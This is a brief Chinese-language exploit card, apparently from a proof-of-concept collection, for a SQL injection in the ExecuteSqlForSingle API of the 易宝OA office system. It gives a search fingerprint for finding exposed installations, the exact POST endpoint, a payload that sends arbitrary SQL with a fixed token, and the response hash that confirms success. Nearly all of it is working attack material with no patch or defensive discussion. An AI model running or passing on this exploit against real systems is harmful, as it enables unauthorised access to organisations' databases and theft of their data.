# 易宝OAExecuteSqlForSingleSQL注入漏洞

易宝OAExecuteSqlForSingle ｜ SQL注入 ｜ —
- **指纹**：`product="顶讯科技-易宝OA系统"`
- **请求**：`POST /api/system/ExecuteSqlForSingle HTTP/1.1`

**Payload**
```
token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)&strParameters
```
- **响应特征**：200 e10adc3949ba59abbe56e057f20f883e